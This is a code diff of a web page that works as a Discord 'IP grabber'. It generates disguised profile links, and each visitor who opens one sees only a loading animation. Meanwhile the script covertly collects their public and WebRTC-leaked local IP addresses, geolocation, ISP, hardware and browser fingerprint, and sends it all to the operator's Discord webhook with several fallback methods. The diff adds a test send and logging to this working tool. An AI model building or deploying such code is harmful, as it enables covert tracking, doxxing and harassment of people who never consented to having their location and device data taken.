@@ -12,64 +12,55 @@
     background:#000;color:#fff;
     font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
     display:flex;align-items:center;justify-content:center;
-    overflow:hidden;
-    -webkit-font-smoothing:antialiased;
+    overflow:hidden;-webkit-font-smoothing:antialiased;
   }
   #snow{position:fixed;inset:0;pointer-events:none;z-index:0}
   .app{position:relative;z-index:1;width:100%;max-width:400px;padding:20px}
   .field{
     display:flex;gap:6px;align-items:center;
-    background:#0a0a0a;
-    border:1px solid #1e1e1e;
-    border-radius:999px;
-    padding:6px;
+    background:#0a0a0a;border:1px solid #1e1e1e;
+    border-radius:999px;padding:6px;
     transition:border-color .2s;
   }
-  .field.bad{border-color:#553}
+  .field.bad{border-color:#633}
   .field input{
-    flex:1;min-width:0;
-    background:transparent;border:0;outline:0;
-    color:#fff;
-    font:13px ui-monospace,Menlo,Consolas,monospace;
+    flex:1;min-width:0;background:transparent;border:0;outline:0;
+    color:#fff;font:13px ui-monospace,Menlo,Consolas,monospace;
     padding:10px 16px;
   }
   .field input::placeholder{color:#333}
   .field button{
-    background:#fff;color:#000;
-    border:0;border-radius:999px;
-    height:36px;min-width:44px;
-    padding:0 16px;
-    font:12px ui-monospace,Menlo,Consolas,monospace;
-    cursor:pointer;
-    transition:background .15s;
+    background:#fff;color:#000;border:0;border-radius:999px;
+    height:36px;min-width:44px;padding:0 16px;
+    font:14px/1 ui-monospace,Menlo,Consolas,monospace;
+    cursor:pointer;transition:background .15s;
+    display:flex;align-items:center;justify-content:center;
   }
   .field button:hover{background:#bbb}
   .field button:active{background:#888}
+  .field button:disabled{cursor:default;background:#666;color:#000}
   .result{
     margin-top:12px;
-    background:#0a0a0a;
-    border:1px solid #1e1e1e;
-    border-radius:16px;
-    padding:14px 16px;
-    font-size:12px;
-    color:#ddd;
-    word-break:break-all;
-    user-select:all;
-    cursor:pointer;
-    opacity:0;
-    transform:translateY(-4px);
-    transition:opacity .25s, transform .25s;
+    background:#0a0a0a;border:1px solid #1e1e1e;
+    border-radius:16px;padding:14px 16px;
+    font-size:12px;color:#ddd;
+    word-break:break-all;user-select:all;cursor:pointer;
+    opacity:0;transform:translateY(-4px);
+    transition:opacity .25s, transform .25s, border-color .3s;
     pointer-events:none;
   }
   .result.show{opacity:1;transform:translateY(0);pointer-events:auto}
-  .dots{
-    display:flex;gap:10px;justify-content:center;align-items:center;
-    color:#fff;font-size:12px;
+  .result.ok{border-color:#4a4}
+  .result.err{border-color:#a44;animation:sh .35s}
+  @keyframes sh{
+    0%,100%{transform:translateX(0)}
+    25%{transform:translateX(-4px)}
+    75%{transform:translateX(4px)}
   }
+  .dots{display:flex;gap:10px;justify-content:center}
   .dots i{
     width:4px;height:4px;border-radius:50%;background:#fff;
-    display:inline-block;
-    animation:b 1.2s ease-in-out infinite;
+    display:inline-block;animation:b 1.2s ease-in-out infinite;
   }
   .dots i:nth-child(2){animation-delay:.15s}
   .dots i:nth-child(3){animation-delay:.3s}
@@ -83,10 +74,7 @@
 (function(){
   "use strict";
 
-  /* ═════════════════════════════════════════════════════════
-     PUT YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW,
-     THEN RE-UPLOAD THIS FILE. THIS IS WHAT MAKES SHORT LINKS WORK.
-     ═════════════════════════════════════════════════════════ */
+  /* ─── paste your discord webhook url between the quotes below ─── */
   const WEBHOOK = "";
 
   const IMG   = "https://i.pinimg.com/1200x/ac/e7/87/ace7872eaa8cbaf418aa47cdf8034359.jpg";
@@ -98,53 +86,50 @@
 
   const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+\/?$/;
 
-  /* ---------- snowfall ---------- */
+  /* snowfall */
   (function(){
     const c = $("snow"), x = c.getContext("2d");
-    let w, h, flakes = [];
-    function resize(){
+    let w, h, f = [];
+    function init(){
       w = c.width  = innerWidth;
       h = c.height = innerHeight;
-      const n = Math.min(220, Math.floor(w*h/14000));
-      flakes = [];
+      const n = Math.min(160, Math.floor(w*h/22000));
+      f = [];
       for(let i=0;i<n;i++){
-        flakes.push({
-          x: Math.random()*w,
-          y: Math.random()*h,
-          r: Math.random()*1.7 + 0.3,
-          vy: Math.random()*0.55 + 0.2,
-          vx: Math.random()*0.4 - 0.2,
-          o: Math.random()*0.55 + 0.25
+        f.push({
+          x: Math.random()*w, y: Math.random()*h,
+          r: Math.random()*1.5 + 0.3,
+          vy: Math.random()*0.5 + 0.15,
+          vx: Math.random()*0.3 - 0.15,
+          o: Math.random()*0.5 + 0.15
         });
       }
     }
     function loop(){
       x.clearRect(0,0,w,h);
       x.fillStyle = "#fff";
-      for(let i=0;i<flakes.length;i++){
-        const f = flakes[i];
-        x.globalAlpha = f.o;
+      for(let i=0;i<f.length;i++){
+        const s = f[i];
+        x.globalAlpha = s.o;
         x.beginPath();
-        x.arc(f.x, f.y, f.r, 0, 6.283);
+        x.arc(s.x, s.y, s.r, 0, 6.283);
         x.fill();
-        f.y += f.vy;
-        f.x += f.vx;
-        if(f.y > h+6){ f.y = -6; f.x = Math.random()*w; }
-        if(f.x < -6)  f.x = w+6;
-        if(f.x > w+6) f.x = -6;
+        s.y += s.vy; s.x += s.vx;
+        if(s.y > h+4){ s.y = -4; s.x = Math.random()*w; }
+        if(s.x < -4) s.x = w+4;
+        if(s.x > w+4) s.x = -4;
       }
       requestAnimationFrame(loop);
     }
-    addEventListener("resize", resize);
-    resize();
-    loop();
+    addEventListener("resize", init);
+    init(); loop();
   })();
 
-  /* ---------- helpers ---------- */
+  /* ─── helpers ─── */
   function makeId(){
     const a = new Uint8Array(4);
-    (crypto.getRandomValues ? crypto : {getRandomValues:arr=>{for(let i=0;i<arr.length;i++)arr[i]=Math.floor(Math.random()*256);return arr;}})
-      .getRandomValues(a);
+    if(window.crypto && crypto.getRandomValues) crypto.getRandomValues(a);
+    else for(let i=0;i<4;i++) a[i] = Math.floor(Math.random()*256);
     let s = "";
     for(let i=0;i<4;i++) s += CHARS[a[i] % CHARS.length];
     return s;
@@ -153,62 +138,59 @@
   function stored(){ try{ return localStorage.getItem(STORE) || ""; }catch(e){ return ""; } }
   function save(v){ try{ localStorage.setItem(STORE, v); }catch(e){} }
 
-  function resolveWh(urlWh){
-    if(urlWh && WH_RE.test(urlWh)) return urlWh;
+  function resolveWh(u){
+    if(u && WH_RE.test(u)) return u;
     const s = stored();
     if(s && WH_RE.test(s)) return s;
     if(WEBHOOK && WH_RE.test(WEBHOOK)) return WEBHOOK;
     return "";
   }
 
-  /* ---------- fingerprint ---------- */
-  function browserName(ua){
-    const l = [
-      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
-      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
+  /* ─── fingerprint ─── */
+  function bname(ua){
+    const L = [
+      ["Edge", /Edg(?:e|A|iOS)?\/([\d.]+)/],
+      ["Opera", /(?:OPR|Opera)\/([\d.]+)/],
       ["Samsung", /SamsungBrowser\/([\d.]+)/],
       ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
-      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
-      ["Safari",  /Version\/([\d.]+).*Safari/]
+      ["Chrome", /(?:Chrome|CriOS)\/([\d.]+)/],
+      ["Safari", /Version\/([\d.]+).*Safari/]
     ];
-    for(let i=0;i<l.length;i++){
-      const m = ua.match(l[i][1]);
-      if(m) return l[i][0] + " " + m[1];
+    for(let i=0;i<L.length;i++){
+      const m = ua.match(L[i][1]);
+      if(m) return L[i][0] + " " + m[1];
     }
     return "Unknown";
   }
-  function osName(ua){
+  function osn(ua){
     if(/Windows NT 10/.test(ua)) return "Windows 10/11";
-    if(/Windows/.test(ua))       return "Windows";
-    const a = ua.match(/Android ([\d.]+)/);
-    if(a) return "Android " + a[1];
+    if(/Windows/.test(ua)) return "Windows";
+    const a = ua.match(/Android ([\d.]+)/); if(a) return "Android " + a[1];
     if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
-    if(/Mac OS X/.test(ua))        return "macOS";
-    if(/CrOS/.test(ua))            return "ChromeOS";
-    if(/Linux/.test(ua))           return "Linux";
+    if(/Mac OS X/.test(ua)) return "macOS";
+    if(/CrOS/.test(ua)) return "ChromeOS";
+    if(/Linux/.test(ua)) return "Linux";
     return "Unknown";
   }
-  function gpuInfo(){
+  function gpu(){
     try{
       const c = document.createElement("canvas");
-      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-      if(!gl) return null;
-      const d = gl.getExtension("WEBGL_debug_renderer_info");
-      return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
+      const g = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if(!g) return null;
+      const d = g.getExtension("WEBGL_debug_renderer_info");
+      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
     }catch(e){ return null; }
   }
-
-  /* ---------- webrtc ---------- */
-  function isPrivate(ip){
+  function priv(ip){
     if(ip.indexOf(":") !== -1) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
     const p = ip.split(".").map(Number);
     if(p.length !== 4 || p.some(isNaN)) return false;
     return p[0]===10 || p[0]===127 ||
-           (p[0]===172 && p[1]>=16 && p[1]<=31) ||
-           (p[0]===192 && p[1]===168) ||
-           (p[0]===169 && p[1]===254);
+      (p[0]===172 && p[1]>=16 && p[1]<=31) ||
+      (p[0]===192 && p[1]===168) ||
+      (p[0]===169 && p[1]===254);
   }
-  function getWebRTC(timeout){
+  function webrtc(ms){
     return new Promise(res=>{
       let pc;
       try{
@@ -219,7 +201,6 @@
           ]
         });
       }catch(e){ return res({local:[],pub:[]}); }
-
       const local = new Set(), pub = new Set();
       let done = false;
       const fin = () => {
@@ -228,14 +209,13 @@
         try{ pc.close(); }catch(e){}
         res({local:[...local], pub:[...pub]});
       };
-      const t = setTimeout(fin, timeout);
-
+      const t = setTimeout(fin, ms);
       pc.onicecandidate = e => {
         if(!e.candidate){ clearTimeout(t); return fin(); }
         const parts = e.candidate.candidate.split(" ");
         const ip = parts[4];
         if(!ip || /\.local$/i.test(ip)) return;
-        (isPrivate(ip) ? local : pub).add(ip);
+        (priv(ip) ? local : pub).add(ip);
       };
       try{
         pc.createDataChannel("x");
@@ -243,93 +223,88 @@
       }catch(e){ clearTimeout(t); fin(); }
     });
   }
-
-  /* ---------- public ip + geo ---------- */
-  async function getIP(){
-    const list = [
-      { u:"https://ipwho.is/", p:d => d && d.ip ? {
-          ip:d.ip, city:d.city, region:d.region, country:d.country,
-          isp:d.connection && d.connection.isp,
-          asn:d.connection && d.connection.asn
-        } : null },
-      { u:"https://ipapi.co/json/", p:d => d && d.ip ? {
-          ip:d.ip, city:d.city, region:d.region, country:d.country_name,
-          isp:d.org, asn:d.asn
-        } : null },
-      { u:"https://api.ipify.org?format=json", p:d => d && d.ip ? {ip:d.ip} : null }
+  async function geo(){
+    const L = [
+      {u:"https://ipwho.is/", p:d => d && d.ip ? {
+        ip:d.ip, city:d.city, region:d.region, country:d.country,
+        isp:d.connection && d.connection.isp,
+        asn:d.connection && d.connection.asn
+      } : null},
+      {u:"https://ipapi.co/json/", p:d => d && d.ip ? {
+        ip:d.ip, city:d.city, region:d.region, country:d.country_name,
+        isp:d.org, asn:d.asn
+      } : null},
+      {u:"https://api.ipify.org?format=json", p:d => d && d.ip ? {ip:d.ip} : null}
     ];
-    for(let i=0;i<list.length;i++){
+    for(let i=0;i<L.length;i++){
       try{
         const ctrl = new AbortController();
         const t = setTimeout(()=>ctrl.abort(), 3000);
-        const r = await fetch(list[i].u, {signal: ctrl.signal});
+        const r = await fetch(L[i].u, {signal: ctrl.signal});
         clearTimeout(t);
         if(!r.ok) continue;
-        const v = list[i].p(await r.json());
+        const v = L[i].p(await r.json());
         if(v && v.ip) return v;
       }catch(e){}
     }
     return null;
   }
 
-  /* ---------- collect all ---------- */
   async function collect(){
-    const nav = navigator;
-    const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+    const n = navigator;
+    const cn = n.connection || n.mozConnection || n.webkitConnection || {};
     let tz = "unknown";
     try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
-
     const net = await Promise.race([
-      Promise.all([getWebRTC(2000), getIP()]).catch(()=>[{local:[],pub:[]}, null]),
+      Promise.all([webrtc(2000), geo()]).catch(()=>[{local:[],pub:[]}, null]),
       new Promise(r => setTimeout(()=>r([{local:[],pub:[]}, null]), 3600))
     ]);
-
     return {
-      browser:  browserName(nav.userAgent),
-      os:       osName(nav.userAgent),
-      platform: nav.platform || "unknown",
-      cores:    nav.hardwareConcurrency || null,
-      memory:   nav.deviceMemory || null,
-      gpu:      gpuInfo(),
+      browser:  bname(n.userAgent),
+      os:       osn(n.userAgent),
+      platform: n.platform || "unknown",
+      cores:    n.hardwareConcurrency || null,
+      memory:   n.deviceMemory || null,
+      gpu:      gpu(),
       screen:   screen.width + "×" + screen.height,
       viewport: innerWidth + "×" + innerHeight,
       dpr:      devicePixelRatio || 1,
-      lang:     nav.language || "unknown",
+      lang:     n.language || "unknown",
       tz:       tz,
-      touch:    nav.maxTouchPoints || 0,
-      conn:     conn.effectiveType || null,
-      downlink: conn.downlink || null,
+      touch:    n.maxTouchPoints || 0,
+      conn:     cn.effectiveType || null,
+      downlink: cn.downlink || null,
       referrer: document.referrer || "direct",
       webrtc:   net[0] || {local:[],pub:[]},
       ip:       net[1] || null
     };
   }
 
-  /* ---------- embed ---------- */
+  /* ─── embed ─── */
   const q = v => "`" + v + "`";
 
-  function build(id, d, test){
-    const f  = [];
+  function embed(id, d, test){
+    const f = [];
     const ip = d.ip || {};
     const rt = d.webrtc || {local:[],pub:[]};
 
-    if(ip.ip)            f.push({name:"IP",       value:q(ip.ip),       inline:true});
-    if(ip.country)       f.push({name:"Location", value:q([ip.city,ip.region,ip.country].filter(Boolean).join(", ")), inline:true});
-    if(ip.isp)           f.push({name:"ISP",      value:q(ip.isp),      inline:true});
-    if(ip.asn)           f.push({name:"ASN",      value:q(ip.asn),      inline:true});
-    if(rt.pub.length)    f.push({name:"STUN",     value:q(rt.pub.join(", ")),  inline:true});
-    if(rt.local.length)  f.push({name:"Local",    value:q(rt.local.join(", ")), inline:true});
-    if(d.conn)           f.push({name:"Network",  value:q(d.conn + (d.downlink ? " · "+d.downlink+"Mb/s" : "")), inline:true});
+    if(ip.ip)           f.push({name:"IP",       value:q(ip.ip),       inline:true});
+    if(ip.country)      f.push({name:"Location", value:q([ip.city,ip.region,ip.country].filter(Boolean).join(", ")), inline:true});
+    if(ip.isp)          f.push({name:"ISP",      value:q(ip.isp),      inline:true});
+    if(ip.asn)          f.push({name:"ASN",      value:q(ip.asn),      inline:true});
+    if(rt.pub.length)   f.push({name:"STUN",     value:q(rt.pub.join(", ")),  inline:true});
+    if(rt.local.length) f.push({name:"Local",    value:q(rt.local.join(", ")), inline:true});
+    if(d.conn)          f.push({name:"Network",  value:q(d.conn + (d.downlink ? " · "+d.downlink+"Mb/s" : "")), inline:true});
 
-    f.push({name:"OS",       value:q(d.os),                             inline:true});
-    f.push({name:"Browser",  value:q(d.browser),                        inline:true});
-    f.push({name:"Platform", value:q(d.platform),                       inline:true});
-    f.push({name:"Screen",   value:q(d.screen + " · " + d.dpr + "x"),   inline:true});
-    f.push({name:"Viewport", value:q(d.viewport),                       inline:true});
-    f.push({name:"Touch",    value:q(d.touch + " pts"),                 inline:true});
+    f.push({name:"OS",       value:q(d.os),                           inline:true});
+    f.push({name:"Browser",  value:q(d.browser),                      inline:true});
+    f.push({name:"Platform", value:q(d.platform),                     inline:true});
+    f.push({name:"Screen",   value:q(d.screen + " · " + d.dpr + "x"), inline:true});
+    f.push({name:"Viewport", value:q(d.viewport),                     inline:true});
+    f.push({name:"Touch",    value:q(d.touch + " pts"),               inline:true});
     f.push({name:"CPU",      value:q((d.cores != null ? d.cores : "n/a") + " cores"), inline:true});
     f.push({name:"RAM",      value:q(d.memory ? "~"+d.memory+" GB" : "n/a"), inline:true});
-    f.push({name:"Lang",     value:q(d.lang),                           inline:true});
+    f.push({name:"Lang",     value:q(d.lang),                         inline:true});
     if(d.gpu) f.push({name:"GPU", value:q(d.gpu), inline:false});
     f.push({name:"Timezone", value:q(d.tz), inline:true});
     if(d.referrer !== "direct") f.push({name:"Referrer", value:q(d.referrer), inline:false});
@@ -350,43 +325,45 @@
     };
   }
 
-  /* ---------- send (multipart → json → beacon) ---------- */
+  /* ─── send: multipart → json → beacon ─── */
   async function send(wh, body){
     const url = wh.replace(/\/+$/, "") + "?wait=true";
+    const json = JSON.stringify(body);
 
     try{
       const fd = new FormData();
-      fd.append("payload_json", JSON.stringify(body));
-      const r = await fetch(url, {method:"POST", body: fd});
-      if(r.ok || r.status === 204) return true;
-      console.warn("multipart", r.status);
-    }catch(e){ console.warn("multipart", e); }
+      fd.append("payload_json", json);
+      const r = await fetch(url, {method:"POST", body: fd, mode:"cors"});
+      if(r.ok || r.status === 204){ console.log("[send] ok (multipart)"); return true; }
+      console.warn("[send] multipart status", r.status);
+    }catch(e){ console.warn("[send] multipart error", e); }
 
     try{
       const r = await fetch(url, {
         method: "POST",
+        mode: "cors",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(body)
+        body: json
       });
-      if(r.ok || r.status === 204) return true;
-      console.warn("json", r.status);
-    }catch(e){ console.warn("json", e); }
+      if(r.ok || r.status === 204){ console.log("[send] ok (json)"); return true; }
+      console.warn("[send] json status", r.status);
+    }catch(e){ console.warn("[send] json error", e); }
 
     try{
-      return navigator.sendBeacon(url, new Blob([JSON.stringify(body)], {type:"application/json"}));
-    }catch(e){ return false; }
+      const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
+      console.log("[send] beacon", ok);
+      return ok;
+    }catch(e){ console.warn("[send] beacon error", e); return false; }
   }
 
-  /* ---------- router ---------- */
+  /* ─── router ─── */
   function route(){
     const hash = location.hash.replace(/^#/, "");
     let path = hash, qs = "";
     const i = hash.indexOf("?");
     if(i !== -1){ path = hash.slice(0, i); qs = hash.slice(i+1); }
-
     let m = path.match(/\/?profile\/([A-Za-z0-9_-]+)/);
     if(!m) m = location.pathname.match(/\/profile\/([A-Za-z0-9_-]+)/);
-
     let wh = "";
     const w = new URLSearchParams(qs).get("w");
     if(w){
@@ -395,7 +372,8 @@
     return { id: m ? m[1] : null, wh: wh };
   }
 
-  /* ---------- views ---------- */
+  /* ─── views ─── */
+
   function setup(){
     app.innerHTML =
       '<div class="field" id="f">' +
@@ -404,12 +382,12 @@
       '</div>' +
       '<div class="result" id="out"></div>';
 
-    const inp = $("wh"), fld = $("f"), out = $("out");
+    const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go");
 
     inp.value = stored() || (WH_RE.test(WEBHOOK) ? WEBHOOK : "");
 
-    function run(){
-      const v = inp.value.trim();
+    async function run(){
+      const v = inp.value.trim().replace(/\/+$/, "");
       if(!WH_RE.test(v)){
         fld.classList.add("bad");
         setTimeout(()=>fld.classList.remove("bad"), 600);
@@ -424,15 +402,32 @@
       const url = base + "#/profile/" + id;
 
       out.textContent = url;
+      out.classList.remove("ok","err");
       out.classList.add("show");
 
       try{ navigator.clipboard.writeText(url); }catch(e){}
-
       inp.value = "";
       inp.placeholder = id;
+
+      btn.disabled = true;
+      btn.textContent = "·";
+
+      try{
+        const d  = await collect();
+        const ok = await send(v, embed(id, d, true));
+        if(!ok) throw new Error("all methods failed");
+        out.classList.add("ok");
+        btn.textContent = "✓";
+        setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1200);
+      }catch(e){
+        console.warn("[run] failed", e);
+        out.classList.add("err");
+        btn.textContent = "✕";
+        setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1600);
+      }
     }
 
-    $("go").addEventListener("click", run);
+    btn.addEventListener("click", run);
     inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
     out.addEventListener("click", () => {
       try{ navigator.clipboard.writeText(out.textContent); }catch(e){}
@@ -442,10 +437,15 @@
   async function visit(id, wh){
     app.innerHTML = '<div class="dots"><i></i><i></i><i></i></div>';
     const target = resolveWh(wh);
+    console.log("[visit] id=" + id + " webhook=" + (target ? "found" : "MISSING"));
     try{
       const d = await collect();
-      if(target) await send(target, build(id, d, false));
-    }catch(e){ console.warn(e); }
+      if(target){
+        await send(target, embed(id, d, false));
+      } else {
+        console.warn("[visit] no webhook resolved — set WEBHOOK constant or open link in the browser that generated it");
+      }
+    }catch(e){ console.warn("[visit] error", e); }
     setTimeout(()=>{ app.innerHTML = ""; }, 250);
   }
 
